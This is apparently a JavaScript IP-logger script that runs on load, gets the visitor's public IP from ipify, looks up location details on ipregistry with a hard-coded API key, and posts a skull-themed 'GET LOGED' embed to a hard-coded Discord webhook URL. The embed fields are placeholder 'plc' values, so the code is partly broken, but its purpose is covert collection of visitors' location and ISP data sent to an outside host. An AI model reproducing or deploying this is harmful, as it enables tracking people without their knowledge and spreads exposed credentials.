apikey = "xgyxzqntjw3tx4wh";
function sendMessage(msg, name, avt) {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1128106190442856448/vH1ohw9bZIB85xz7r8W-ujwfCcvwZuBAoKguaIAe_u2ITsXwgfuE5vO2zyloNwbeB6sf");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
      username: name,
      avatar_url: avt,
      content: msg
    }
    request.send(JSON.stringify(params));
}
function serch(ip){
    fetch('https://api.ipregistry.co/' + ip + '?key=xgyxzqntjw3tx4wh')
        .then(response => response.json())
        .then(data => sendMessage({
            "content": null,
            "embeds": [
              {
                "title": "💀INFO LOGG💀",
                "color": 39423,
                "fields": [
                  {
                    "name": "CONT:                              💀",
                    "value": "plc"
                  },
                  {
                    "name": "REGION:                          💀",
                    "value": "plc"
                  },
                  {
                    "name": "ZIP:                                    💀",
                    "value": "plc"
                  },
                  {
                    "name": "IP:                                       💀",
                    "value": "plc"
                  },
                  {
                    "name": "ISP:                                     💀",
                    "value": "plc"
                  }
                ],
                "author": {
                  "name": "~thatguy.~",
                  "icon_url": "https://wallpapers-clan.com/wp-content/uploads/2022/10/skeleton-pfp-7.jpg"
                },
                "footer": {
                  "text": "💀GET LOGED💀"
                }
              }
            ],
            "attachments": []
          }, "logger", "")  )
}
fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => serch(data.ip));



